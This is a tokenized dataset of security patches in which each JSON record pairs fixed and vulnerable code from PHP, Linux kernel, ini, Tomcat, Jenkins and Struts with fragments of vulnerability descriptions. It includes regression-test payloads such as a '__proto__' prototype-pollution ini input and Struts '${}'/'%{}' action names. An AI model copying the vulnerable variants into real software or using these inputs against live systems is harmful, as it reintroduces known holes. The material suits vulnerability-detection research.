"reply_toaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "sender", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "senderaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "return_path", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "return_pathaddress", "\"", ",", "fulladdress", ",", "1", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "email", "message", "containing", "an", "overly", "long", "\\\"To:\\\"", "header"]}
{"contents": ["empty"], "code_tokens": ["err", "=", "register_pernet_device", "(", "&", "ipip_net_ops", ")", ";", "if", "(", "err", "<", "0", ")", "return", "err", ";", "err", "=", "xfrm4_tunnel_register", "(", "&", "ipip_handler", ",", "AF_INET", ")", ";", "if", "(", "err", "<", "0", ")", "{", "unregister_pernet_device", "(", "&", "ipip_net_ops", ")", ";", "err", "=", "register_pernet_device", "(", "&", "ip6_tnl_net_ops", ")", ";", "if", "(", "err", "<", "0", ")", "goto", "out_pernet", ";", "err", "=", "xfrm6_tunnel_register", "(", "&", "ip4ip6_handler", ",", "AF_INET", ")", ";", "if", "(", "err", "<", "0", ")", "{", "goto", "out_ip4ip6", ";", "err", "=", "xfrm6_tunnel_register", "(", "&", "ip6ip6_handler", ",", "AF_INET6", ")", ";", "if", "(", "err", "<", "0", ")", "{", "goto", "out_ip6ip6", ";", "out_ip6ip6", ":", "out_ip4ip6", ":", "unregister_pernet_device", "(", "&", "ip6_tnl_net_ops", ")", ";", "out_pernet", ":", "return", "err", ";", "err", "=", "xfrm4_tunnel_register", "(", "&", "sit_handler", ",", "AF_INET6", ")", ";", "if", "(", "err", "<", "0", ")", "{", "unregister_pernet_device", "(", "&", "sit_net_ops", ")", ";", "printk", "(", "KERN_INFO", "\"", "sit", "init", ":", "Can", "'", "t", "add", "protocol", "\\", "n", "\"", ");", "}", "xfrm6_tunnel_spi_kmem", "=", "kmem_cache_create", "(", "\"", "xfrm6_tunnel_spi", "\"", ",", "sizeof", "(", "struct", "xfrm6_tunnel_spi", ")", ",", "0", ",", "SLAB_HWCACHE_ALIGN", ",", "NULL", ")", ";", "if", "(", "!", "xfrm6_tunnel_spi_kmem", ")", "return", "-", "ENOMEM", ";", "rv", "=", "register_pernet_subsys", "(", "&", "xfrm6_tunnel_net_ops", ")", ";", "if", "(", "rv", "<", "0", ")", "goto", "out_pernet", ";", "goto", "out_type", ";", "goto", "out_xfrm6", ";", "goto", "out_xfrm46", ";", "out_xfrm46", ":", "out_xfrm6", ":", "out_type", ":", "unregister_pernet_subsys", "(", "&", "xfrm6_tunnel_net_ops", ")", ";", "out_pernet", ":", "kmem_cache_destroy", "(", "xfrm6_tunnel_spi_kmem", ")", ";", "unregister_pernet_subsys", "(", "&", "xfrm6_tunnel_net_ops", ")", ";", "kmem_cache_destroy", "(", "xfrm6_tunnel_spi_kmem", ")", ";</s>if", "(", "xfrm4_tunnel_register", "(", "&", "ipip_handler", ",", "AF_INET", ")", ")", "{", "return", "-", "EAGAIN", ";", "err", "=", "register_pernet_device", "(", "&", "ipip_net_ops", ")", ";", "if", "(", "err", ")", "xfrm4_tunnel_deregister", "(", "&", "ipip_handler", ",", "AF_INET", ")", ";", "if", "(", "xfrm6_tunnel_register", "(", "&", "ip4ip6_handler", ",", "AF_INET", ")", ")", "{", "err", "=", "-", "EAGAIN", ";", "goto", "out", ";", "if", "(", "xfrm6_tunnel_register", "(", "&", "ip6ip6_handler", ",", "AF_INET6", ")", ")", "{", "err", "=", "-", "EAGAIN", ";", "goto", "unreg_ip4ip6", ";", "err", "=", "register_pernet_device", "(", "&", "ip6_tnl_net_ops", ")", ";", "if", "(", "err", "<", "0", ")", "goto", "err_pernet", ";", "err_pernet", ":", "xfrm6_tunnel_deregister", "(", "&", "ip6ip6_handler", ",", "AF_INET6", ")", ";", "unreg_ip4ip6", ":", "out", ":", "if", "(", "xfrm4_tunnel_register", "(", "&", "sit_handler", ",", "AF_INET6", ")", "<", "0", ")", "{", "printk", "(", "KERN_INFO", "\"", "sit", "init", ":", "Can", "'", "t", "add", "protocol", "\\", "n", "\"", ");", "return", "-", "EAGAIN", ";", "}", "xfrm4_tunnel_deregister", "(", "&", "sit_handler", ",", "AF_INET6", ")", ";", "static", "int", "__init", "xfrm6_tunnel_spi_init", "(", "void", ")", "{", "xfrm6_tunnel_spi_kmem", "=", "kmem_cache_create", "(", "\"", "xfrm6_tunnel_spi", "\"", ",", "sizeof", "(", "struct", "xfrm6_tunnel_spi", ")", ",", "0", ",", "SLAB_HWCACHE_ALIGN", ",", "NULL", ")", ";", "if", "(", "!", "xfrm6_tunnel_spi_kmem", ")", "return", "-", "ENOMEM", ";", "return", "0", ";", "}", "static", "void", "xfrm6_tunnel_spi_fini", "(", "void", ")", "{", "kmem_cache_destroy", "(", "xfrm6_tunnel_spi_kmem", ")", ";", "}", "goto", "err", ";", "goto", "unreg", ";", "goto", "dereg6", ";", "rv", "=", "xfrm6_tunnel_spi_init", "(", ");", "if", "(", "rv", "<", "0", ")", "goto", "dereg46", ";", "rv", "=", "register_pernet_subsys", "(", "&", "xfrm6_tunnel_net_ops", ")", ";", "if", "(", "rv", "<", "0", ")", "goto", "deregspi", ";", "deregspi", ":", "xfrm6_tunnel_spi_fini", "(", ");", "dereg46", ":", "xfrm6_tunnel_deregister", "(", "&", "xfrm46_tunnel_handler", ",", "AF_INET", ")", ";", "dereg6", ":", "unreg", ":", "err", ":", "unregister_pernet_subsys", "(", "&", "xfrm6_tunnel_net_ops", ")", ";", "xfrm6_tunnel_spi_fini", "(", ");"], "docstring_tokens": ["by", "sending", "a", "packet", "during", "module", "loading", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "section", "=", "==", "'", "__proto__", "'", ")", "{", "/", "/", "not", "allowed", "/", "/", "keep", "parsing", "the", "section", ",", "but", "don", "'", "t", "attach", "it", ".", "p", "=", "{", "}", "return", "}", "if", "(", "key", "=", "==", "'", "__proto__", "'", ")", "return", "if", "(", "part", "=", "==", "'", "__proto__", "'", ")", "return", "var", "ini", "=", "require", "(", "'.", "./", "')", "var", "t", "=", "require", "(", "'", "tap", "'", ")", "var", "data", "=", "`", "__proto__", "=", "quux", "foo", "=", "baz", "[", "__proto__", "]", "foo", "=", "bar", "[", "other", "]", "foo", "=", "asdf", "[", "kid", ".", "__proto__", ".", "foo", "]", "foo", "=", "kid", "[", "arrproto", "]", "hello", "=", "snyk", "__proto__", "[", "]", "=", "you", "did", "a", "good", "job", "__proto__", "[", "]", "=", "so", "you", "deserve", "arrays", "thanks", "=", "true", "`", "var", "res", "=", "ini", ".", "parse", "(", "data", ")", "t", ".", "deepEqual", "(", "res", ",", "{", "foo", ":", "'", "baz", "'", ",", "other", ":", "{", "foo", ":", "'", "asdf", "'", ",", "}", ",", "kid", ":", "{", "foo", ":", "{", "foo", ":", "'", "kid", "'", ",", "}", ",", "}", ",", "arrproto", ":", "{", "hello", ":", "'", "snyk", "'", ",", "thanks", ":", "true", ",", "}", ",", "}", ")", "t", ".", "equal", "(", "res", ".", "__proto__", ",", "Object", ".", "prototype", ")", "t", ".", "equal", "(", "res", ".", "kid", ".", "__proto__", ",", "Object", ".", "prototype", ")", "t", ".", "equal", "(", "res", ".", "kid", ".", "foo", ".", "__proto__", ",", "Object", ".", "prototype", ")", "t", ".", "equal", "(", "res", ".", "arrproto", ".", "__proto__", ",", "Object", ".", "prototype", ")", "t", ".", "equal", "(", "Object", ".", "prototype", ".", "foo", ",", "undefined", ")", "t", ".", "equal", "(", "Object", ".", "prototype", "[", "0", "]", ",", "undefined", ")", "t", ".", "equal", "(", "Object", ".", "prototype", "[", "'", "0", "'", "],", "undefined", ")", "t", ".", "equal", "(", "Object", ".", "prototype", "[", "1", "]", ",", "undefined", ")", "t", ".", "equal", "(", "Object", ".", "prototype", "[", "'", "1", "'", "],", "undefined", ")", "t", ".", "equal", "(", "Array", ".", "prototype", "[", "0", "]", ",", "undefined", ")", "t", ".", "equal", "(", "Array", ".", "prototype", "[", "1", "]", ",", "undefined", ")</s>"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["static", "bool", "nf_generic_should_process", "(", "u8", "proto", ")", "{", "switch", "(", "proto", ")", "{", "#", "ifdef", "CONFIG_NF_CT_PROTO_SCTP_MODULE", "case", "IPPROTO_SCTP", ":", "return", "false", ";", "#", "endif", "#", "ifdef", "CONFIG_NF_CT_PROTO_DCCP_MODULE", "case", "IPPROTO_DCCP", ":", "return", "false", ";", "#", "endif", "#", "ifdef", "CONFIG_NF_CT_PROTO_GRE_MODULE", "case", "IPPROTO_GRE", ":", "return", "false", ";", "#", "endif", "#", "ifdef", "CONFIG_NF_CT_PROTO_UDPLITE_MODULE", "case", "IPPROTO_UDPLITE", ":", "return", "false", ";", "#", "endif", "default", ":", "return", "true", ";", "}", "}", "return", "nf_generic_should_process", "(", "nf_ct_protonum", "(", "ct", ")", ");</s>return", "true", ";"], "docstring_tokens": ["via", "packets", "with", "disallowed", "port", "numbers", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "jh", "-", ">", "b_transaction", "=", "=", "transaction", "&", "&", "jh", "-", ">", "b_jlist", "!", "=", "BJ_Metadata", ")", "pr_err", "(", "\"", "JBD2", ":", "assertion", "failure", ":", "h_type", "=", "%", "u", "\"", "\"", "h_line_no", "=", "%", "u", "block_no", "=", "%", "llu", "jlist", "=", "%", "u", "\\", "n", "\"", ",", "handle", "-", ">", "h_type", ",", "handle", "-", ">", "h_line_no", ",", "(", "unsigned", "long", "long", ")", "bh", "-", ">", "b_blocknr", ",", "jh", "-", ">", "b_jlist", ")", ";", "jh", "-", ">", "b_modified", "=", "1", ";</s>jh", "-", ">", "b_modified", "=", "1", ";"], "docstring_tokens": ["by", "mounting", "and", "operating", "on", "a", "crafted", "ext4", "filesystem", "image", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "http_accept_len", ">", "ULOC_FULLNAME_CAPACITY", ")", "{", "/", "*", "check", "each", "fragment", ",", "if", "any", "bigger", "than", "capacity", ",", "can", "'", "t", "do", "it", "due", "to", "bug", "#", "72533", "*", "/", "char", "*", "start", "=", "http_accept", ";", "char", "*", "end", ";", "size_t", "len", ";", "do", "{", "end", "=", "strchr", "(", "start", ",", "'", ",'", ");", "len", "=", "end", "?", "end", "-", "start", ":", "http_accept_len", "-", "(", "start", "-", "http_accept", ")", ";", "if", "(", "len", ">", "ULOC_FULLNAME_CAPACITY", ")", "{", "intl_error_set", "(", "NULL", ",", "U_ILLEGAL_ARGUMENT_ERROR", ",", "\"", "locale_accept_from_http", ":", "locale", "string", "too", "long", "\"", ",", "0", "TSRMLS_CC", ")", ";", "RETURN_FALSE", ";", "}", "if", "(", "end", ")", "{", "start", "=", "end", "+", "1", ";", "}", "}", "while", "(", "end", "!", "=", "NULL", ")", ";", "}", "-", "-", "TEST", "-", "-", "Bug", "#", "72533", "(", "locale_accept_from_http", "out", "-", "of", "-", "bounds", "access", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "intl", "'", ")", ")", "print", "'", "skip", "'", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "function", "ut_main", "(", ")", "{", "$", "ret", "=", "var_export", "(", "ut_loc_accept_http", "(", "str_repeat", "(", "'", "x", "'", ",", "256", ")", "),", "true", ")", ";", "$", "ret", ".", "=", "\"", "\\", "n", "\"", ";", "if", "(", "intl_is_failure", "(", "intl_get_error_code", "(", "))", ")", "{", "$", "ret", ".", "=", "var_export", "(", "intl_get_error_message", "(", "),", "true", ")", ";", "}", "$", "ret", ".", "=", "\"", "\\", "n", "\"", ";", "$", "ret", ".", "=", "var_export", "(", "ut_loc_accept_http", "(", "str_repeat", "(", "'", "en", ",", "',", "256", ")", "),", "true", ")", ";", "$", "ret", ".", "=", "\"", "\\", "n", "\"", ";", "if", "(", "intl_is_failure", "(", "intl_get_error_code", "(", "))", ")", "{", "$", "ret", ".", "=", "var_export", "(", "intl_get_error_message", "(", "),", "true", ")", ";", "}", "return", "$", "ret", ";", "}", "include_once", "(", "'", "ut_common", ".", "inc", "'", ")", ";", "ut_run", "(", ");", "?", ">", "-", "-", "EXPECTF", "-", "-", "false", "'", "locale_accept_from_http", ":", "locale", "string", "too", "long", ":", "U_ILLEGAL_ARGUMENT_ERROR", "'", "'", "en", "'</s>"], "docstring_tokens": ["via", "a", "call", "with", "a", "long", "argument", "."]}
{"contents": ["empty"], "code_tokens": ["boolean", "isError", "=", "DispatcherType", ".", "ERROR", "=", "=", "request", ".", "getDispatcherType", "(", ");", "<", "fix", ">", "Use", "a", "more", "reliable", "mechanism", "for", "the", "<", "code", ">", "DefaultServlet", "<", "/", "code", ">", "when", "determining", "if", "the", "current", "request", "is", "for", "custom", "error", "page", "or", "not", ".", "(", "markt", ")", "<", "/", "fix", "></s>boolean", "isError", "=", "response", ".", "getStatus", "(", ")", ">", "=", "HttpServletResponse", ".", "SC_BAD_REQUEST", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "GET", "request"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "item", ".", "hasPermission", "(", "Item", ".", "CONFIGURE", ")", ")", "{", "return", "FormValidation", ".", "ok", "(", ");", "}", "@", "RequirePOST", "Jenkins", ".", "getActiveInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "@", "RequirePOST", "Jenkins", ".", "getActiveInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";", "@", "RequirePOST", "Jenkins", ".", "getActiveInstance", "(", ").", "checkPermission", "(", "Jenkins", ".", "ADMINISTER", ")", ";</s>"], "docstring_tokens": ["creating", "an", "SSH", "credential", "referencing", "an", "arbitrary", "file", "on", "the", "Jenkins", "master"]}
{"contents": ["empty"], "code_tokens": ["iov_iter_advance", "(", "ii", ",", "tmp", ")", ";</s>iov_iter_advance", "(", "ii", ",", "tmp", ")", ";"], "docstring_tokens": ["specially", "crafted", "sequence", "of", "iovs"]}
{"contents": ["empty"], "code_tokens": ["typedef", "struct", "_php_mcrypt", "{", "\"", "mcrypt", "\"", ",", "ZEND_FETCH_RESOURCE", "(", "pm", ",", "php_mcrypt", "*", ",", "&", "mcryptind", ",", "-", "1", ",", "\"", "MCrypt", "\"", ",", "le_mcrypt", ")", ";", "if", "(", "pm", ")", "{", "mode", ",", "if", "(", "data_size", "<", "=", "0", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Integer", "overflow", "in", "data", "size", "\"", ");", "RETURN_FALSE", ";", "}", "if", "(", "data_size", "<", "=", "0", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Integer", "overflow", "in", "data", "size", "\"", ");", "RETURN_FALSE", ";", "}", "RETURN_TRUE", "int", "cipher_len", ",", "module_len", ";", "int", "cipher_len", ",", "module_len", ";", "int", "cipher_len", ",", "module_len", ";", "if", "(", "key_length_sizes", "[", "i", "]", ">", "=", "key_len", "&", "&</s>typedef", "struct", "_php_mcrypt", "{", "\"", "mcrypt", "\"", ",", "ZEND_FETCH_RESOURCE", "(", "pm", ",", "php_mcrypt", "*", ",", "&", "mcryptind", ",", "-", "1", ",", "\"", "MCrypt", "\"", ",", "le_mcrypt", ")", ";", "if", "(", "pm", ")", "{", "mode", ",", "RETURN_TRUE", "int", "cipher_len", ",", "module_len", ";", "int", "cipher_len", ",", "module_len", ";", "int", "cipher_len", ",", "module_len", ";", "if", "(", "key_length_sizes", "[", "i", "]", ">", "=", "key_len", "&", "&"], "docstring_tokens": ["sending", "an", "overly", "long", "argument"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")", "spin_lock_irqsave", "(", "&", "hashbin", "-", ">", "hb_spinlock", ",", "flags", ")", ";", "while", "(", "1", ")", "{", "queue", "=", "dequeue_first", "(", "(", "irda_queue_t", "*", "*)", "&", "hashbin", "-", ">", "hb_queue", "[", "i", "]", ");", "if", "(", "!", "queue", ")", "break", ";", "if", "(", "free_func", ")", "{", "if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")", "spin_unlock_irqrestore", "(", "&", "hashbin", "-", ">", "hb_spinlock", ",", "flags", ")", ";", "free_func", "(", "queue", ")", ";", "if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")", "spin_lock_irqsave", "(", "&", "hashbin", "-", ">", "hb_spinlock", ",", "flags", ")", ";", "}", "if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")</s>#", "ifdef", "CONFIG_LOCKDEP", "static", "int", "hashbin_lock_depth", "=", "0", ";", "#", "endif", "if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")", "{", "spin_lock_irqsave_nested", "(", "&", "hashbin", "-", ">", "hb_spinlock", ",", "flags", ",", "hashbin_lock_depth", "+", "+)", ";", "}", "queue", "=", "dequeue_first", "(", "(", "irda_queue_t", "*", "*)", "&", "hashbin", "-", ">", "hb_queue", "[", "i", "]", ");", "while", "(", "queue", ")", "{", "if", "(", "free_func", ")", "(", "*", "free_func", ")", "(", "queue", ")", ";", "queue", "=", "dequeue_first", "(", "(", "irda_queue_t", "*", "*)", "&", "hashbin", "-", ">", "hb_queue", "[", "i", "]", ");", "if", "(", "hashbin", "-", ">", "hb_type", "&", "HB_LOCK", ")", "{", "#", "ifdef", "CONFIG_LOCKDEP", "hashbin_lock_depth", "-", "-;", "#", "endif", "}"], "docstring_tokens": ["using", "specially-crafted", "operations"]}
{"contents": ["empty"], "code_tokens": ["IRDA_ASSERT", "(", "name_len", "<", "IAS_MAX_CLASSNAME", "+", "1", ",", "return", ";", ");", "IRDA_ASSERT", "(", "attr_len", "<", "IAS_MAX_ATTRIBNAME", "+", "1", ",", "return", ";", ");</s>"], "docstring_tokens": ["sending", "overly", "long", "length", "fields"]}
{"contents": ["empty"], "code_tokens": ["</s>aio_free_ring", "(", "ctx", ")", ";"], "docstring_tokens": ["via", "vectors", "involving", "an", "error", "condition", "in", "the", "aio_setup_ring", "function", "."]}
{"contents": ["empty"], "code_tokens": ["/", "**", "actions", "names", "'", "whitelist", "*", "*/", "public", "static", "final", "String", "STRUTS_ALLOWED_ACTION_NAMES", "=", "\"", "struts", ".", "allowed", ".", "action", ".", "names", "\"", ";", "import", "java", ".", "util", ".", "*;", "protected", "String", "allowedActionNames", "=", "\"", "[", "a", "-", "z", "]", "*[", "A", "-", "Z", "]", "*[", "0", "-", "9", "]", "*[", ".\\", "\\-", "_", "!", "/]", "*\"", ";", "@", "Inject", "(", "value", "=", "StrutsConstants", ".", "STRUTS_ALLOWED_ACTION_NAMES", ",", "required", "=", "false", ")", "public", "void", "setAllowedActionNames", "(", "String", "allowedActionNames", ")", "{", "this", ".", "allowedActionNames", "=", "allowedActionNames", ";", "}", "mapping", ".", "setName", "(", "cleanupActionName", "(", "name", ")", ");", "}", "/", "**", "*", "Cleans", "up", "action", "name", "from", "suspicious", "characters", "*", "*", "@", "param", "rawActionName", "action", "name", "extracted", "from", "URI", "*", "@", "return", "safe", "action", "name", "*", "/", "protected", "String", "cleanupActionName", "(", "final", "String", "rawActionName", ")", "{", "if", "(", "rawActionName", ".", "matches", "(", "allowedActionNames", ")", ")", "{", "return", "rawActionName", ";", "}", "else", "{", "String", "cleanActionName", "=", "rawActionName", ";", "for", "(", "String", "chunk", ":", "rawActionName", ".", "split", "(", "allowedActionNames", ")", ")", "{", "cleanActionName", "=", "cleanActionName", ".", "replace", "(", "chunk", ",", "\"", "\")", ";", "}", "return", "cleanActionName", ";", "}", "public", "void", "testAllowedActionNames", "(", ")", "throws", "Exception", "{", "DefaultActionMapper", "mapper", "=", "new", "DefaultActionMapper", "(", ");", "String", "actionName", "=", "\"", "action", "\"", ";", "assertEquals", "(", "actionName", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "action", "}", "\";", "assertEquals", "(", "\"", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "${", "%{", "action", "}", "}}", "\";", "assertEquals", "(", "\"", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "${", "#", "foo", "=", "'", "action", "'", ",#", "foo", "}", "\";", "assertEquals", "(", "\"", "fooactionfoo", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "actionName", "=", "\"", "test", "-", "action", "\"", ";", "assertEquals", "(", "\"", "test", "-", "action", "\"", ",", "mapper", ".", "cleanupActionName", "(", "actionName", ")", ");", "}</s>import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Set", ";", "mapping", ".", "setName", "(", "name", ")", ";"], "docstring_tokens": ["via", "a", "request", "with", "a", "crafted", "value", "that", "contains", "both", "\"${}\"", "and", "\"%{}\"", "sequences"]}
{"contents": ["empty"], "code_tokens": ["-", "Fixed", "Bug", "#", "49785", "(", "insufficient", "input", "string", "validation", "of", "htmlspecialchars", "(", "))", ".", "(", "Moriyoshi", ",", "hello", "at", "iwamot", "dot", "com", ")", "inline", "static", "unsigned", "int", "get_next_char", "(", "enum", "entity_charset", "charset", ",", "unsigned", "int", "this_char", "=", "0", ";", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "*", "newpos", "=", "pos", "+", "1", ";", "return", "str", "[", "pos", "]", ";", "unsigned", "char", "c", ";", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "c", "=", "str", "[", "pos", "]", ";", "if", "(", "c", "<", "0x80", ")", "{", "MB_WRITE", "(", "c", ")", ";", "this_char", "=", "c", ";", "pos", "+", "+;", "}", "else", "if", "(", "c", "<", "0xc0", ")", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "}", "else", "if", "(", "c", "<", "0xe0", ")", "{", "CHECK_LEN", "(", "pos", ",", "2", ")", ";", "this_char", "=", "(", "(", "c", "&", "0x1f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", ";", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "c", ")", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "1", "]", ");", "pos", "+", "=", "2", ";", "}", "else", "if", "(", "c", "<", "0xf0", ")", "{", "CHECK_LEN", "(", "pos", ",", "3", ")", ";", "this_char", "=", "(", "(", "c", "&", "0x0f", ")", "<", "<", "12", ")", "|", "(", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "2", "]", "&", "0x3f", ")", ";", "if", "(", "this_char", "<", "0x800", ")", "{", "return", "0", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "c", ")", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "1", "]", ");", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "2", "]", ");", "pos", "+", "=", "3", ";", "}", "else", "if", "(", "c", "<", "0xf8", ")", "{", "CHECK_LEN", "(", "pos", ",", "4", ")", ";", "this_char", "=", "(", "(", "c", "&", "0x07", ")", "<", "<", "18", ")", "|", "(", "(", "str", "[", "pos", "+", "1", "]", "&", "0x3f", ")", "<", "<", "12", ")", "|", "(", "(", "str", "[", "pos", "+", "2", "]", "&", "0x3f", ")", "<", "<", "6", ")", "|", "(", "str", "[", "pos", "+", "3", "]", "&", "0x3f", ")", ";", "if", "(", "this_char", "<", "0x10000", ")", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "c", ")", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "1", "]", ");", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "2", "]", ");", "MB_WRITE", "(", "(", "unsigned", "char", ")", "str", "[", "pos", "+", "3", "]", ");", "pos", "+", "=", "4", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "}", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "if", "(", "this_char", ">", "=", "0x81", "&", "&", "this_char", "<", "=", "0xfe", ")", "{", "next_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "this_char", ")", ";", "this_char", "=", "(", "this_char", "<", "<", "8", ")", "|", "next_char", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "}", "else", "{", "MB_WRITE", "(", "this_char", ")", ";", "break", ";", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "if", "(", "(", "this_char", ">", "=", "0x81", "&", "&", "this_char", "<", "=", "0x9f", ")", "|", "|", "(", "this_char", ">", "=", "0xe0", "&", "&", "this_char", "<", "=", "0xfc", ")", ")", "{", "next_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "this_char", ")", ";", "this_char", "=", "(", "this_char", "<", "<", "8", ")", "|", "next_char", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "}", "else", "{", "MB_WRITE", "(", "this_char", ")", ";", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "next_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "this_char", ")", ";", "this_char", "=", "(", "this_char", "<", "<", "8", ")", "|", "next_char", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "next_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "this_char", ")", ";", "this_char", "=", "(", "this_char", "<", "<", "8", ")", "|", "next_char", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "next2_char", "=", "str", "[", "pos", "+", "1", "]", ";", "pos", "+", "=", "2", ";", "MB_WRITE", "(", "this_char", ")", ";", "this_char", "=", "(", "this_char", "<", "<", "16", ")", "|", "(", "next_char", "<", "<", "8", ")", "|", "next_char", ";", "}", "else", "{", "*", "status", "=", "FAILURE", ";", "return", "0", ";", "}", "else", "{", "MB_WRITE", "(", "this_char", ")", ";", "/", "*", "single", "-", "byte", "charsets", "*", "/", "CHECK_LEN", "(", "pos", ",", "1", ")", ";", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "MB_WRITE", "(", "this_char", ")", ";", "unsigned", "int", "this_char", "=", "get_next_char", "(", "charset", ",", "old", ",", "oldlen", ",", "&", "i", ",", "mbsequence", ",", "&", "mbseqlen", ",", "&", "status", ")", ";</s>-", "Fixed", "bug", "#", "49809", "(", "time_sleep_until", "(", ")", "is", "not", "available", "on", "OpenSolaris", ")", ".", "(", "Jani", ")", "-", "Fixed", "bug", "#", "49757", "(", "long2ip", "(", ")", "can", "return", "wrong", "value", "in", "a", "multi", "-", "threaded", "-", "Fixed", "bug", "#", "49738", "(", "calling", "mcrypt", "(", ")", "after", "mcrypt_generic_deinit", "(", ")", "crashes", ")", ".", "@", "@", "-", "492", ",", "7", "+", "492", ",", "7", "@", "@", "struct", "basic_entities_dec", "{", "inline", "static", "unsigned", "short", "get_next_char", "(", "enum", "entity_charset", "charset", ",", "unsigned", "short", "this_char", "=", "str", "[", "pos", "+", "+]", ";", "return", "this_char", ";", "MB_WRITE", "(", "(", "unsigned", "char", ")", "this_char", ")", ";", "unsigned", "long", "utf", "=", "0", ";", "int", "stat", "=", "0", ";", "int", "more", "=", "1", ";", "/", "*", "unpack", "utf", "-", "8", "encoding", "into", "a", "wide", "char", ".", "*", "Code", "stolen", "from", "the", "mbstring", "extension", "*", "/", "do", "{", "more", "=", "0", ";", "if", "(", "stat", ")", "{", "/", "*", "we", "didn", "'", "t", "finish", "the", "UTF", "sequence", "correctly", "*", "/", "*", "status", "=", "FAILURE", ";", "}", "break", ";", "}", "else", "if", "(", "this_char", "<", "0xc0", ")", "{", "switch", "(", "stat", ")", "{", "case", "0x10", ":", "/", "*", "2", ",", "2nd", "*", "/", "case", "0x21", ":", "/", "*", "3", ",", "3rd", "*", "/", "case", "0x32", ":", "/", "*", "4", ",", "4th", "*", "/", "case", "0x43", ":", "/", "*", "5", ",", "5th", "*", "/", "case", "0x54", ":", "/", "*", "6", ",", "6th", "*", "/", "/", "*", "last", "byte", "in", "sequence", "*", "/", "more", "=", "0", ";", "utf", "|", "=", "(", "this_char", "&", "0x3f", ")", ";", "this_char", "=", "(", "unsigned", "short", ")", "utf", ";", "break", ";", "case", "0x20", ":", "/", "*", "3", ",", "2nd", "*", "/", "case", "0x31", ":", "/", "*", "4", ",", "3rd", "*", "/", "case", "0x42", ":", "/", "*", "5", ",", "4th", "*", "/", "case", "0x53", ":", "/", "*", "6", ",", "5th", "*", "/", "/", "*", "penultimate", "char", "*", "/", "utf", "|", "=", "(", "(", "this_char", "&", "0x3f", ")", "<", "<", "6", ")", 